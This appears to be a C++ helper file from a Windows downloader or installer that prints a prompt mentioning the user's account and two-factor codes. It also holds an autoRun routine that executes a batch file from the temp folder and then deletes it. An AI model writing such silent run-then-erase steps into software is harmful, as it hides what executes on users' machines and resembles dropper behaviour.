//func_ez.cpp
#include <iostream>
#include <Windows.h>
#include <io.h>
using namespace std;

void defaultPrompt()
{
	system("cls");
	cout << "Congratulations! You have inputted the information we need." << endl;
	cout << "If you use your own account, the program will ask you to enter your two-factor verification code" << endl;
	cout << "The download is starting and the program will automatically close after the download is completed." << endl;
	cout << "Current download location is: ";
}

void autoRun()
{
	system("%temp%\\config.bat");
	system("timeout 1 >nul && del %temp%\\config.bat");
}

int checkArch()
{
	void* number = 0;
	return sizeof(&number);
}

bool checkVer()
{
	if (!_access("DotnetInstallHelper.exe", 0))
	{
		return true;
	}
	else
	{
		return false;
	}
}